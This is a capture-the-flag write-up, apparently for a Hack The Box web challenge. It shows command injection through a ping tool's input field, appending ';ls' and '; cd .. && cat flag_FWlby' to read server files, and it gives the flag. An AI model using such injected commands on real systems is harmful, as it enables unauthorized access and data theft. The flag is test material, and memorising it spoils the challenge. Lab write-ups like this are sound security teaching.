# Looking Glass - Writeup

## Problem
We've built the most secure networking tool in the market, come and check it out!

## Solution
1. Looking at the website, we realise that we are able to run a ping command and the output of the ping command will be displayed on the webpage.
```code
PING 139.59.190.151 (139.59.190.151): 56 data bytes
--- 139.59.190.151 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
```
2. This might possibly be a command injection attack and we try to exploit this vulnerability using `139.59.190.151;ls` in the input field. The output `ls` command is the displayed on the webpage.
```code
PING 139.59.190.151 (139.59.190.151): 56 data bytes
--- 139.59.190.151 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
index.php
```
3. However, we only find an `index.php` file and analysing the file does not provide us any clue to what the flag is. 
4. Now, we will view the root directory by using `139.59.190.151; cd .. && ls` in the input field, and we find a `flag_FWlby` file which might contain the flag.
```code
PING 139.59.190.151 (139.59.190.151): 56 data bytes
--- 139.59.190.151 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
bin
boot
dev
entrypoint.sh
etc
flag_FWlby
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
www
```
5. We can get the flag by using `139.59.190.151; cd .. && cat flag_FWlby` in the input field.
```code
PING 139.59.190.151 (139.59.190.151): 56 data bytes
--- 139.59.190.151 ping statistics ---
4 packets transmitted, 0 packets received, 100% packet loss
HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
```

## Flag
flag : HTB{I_f1n4lly_l00k3d_thr0ugh_th3_rc3}
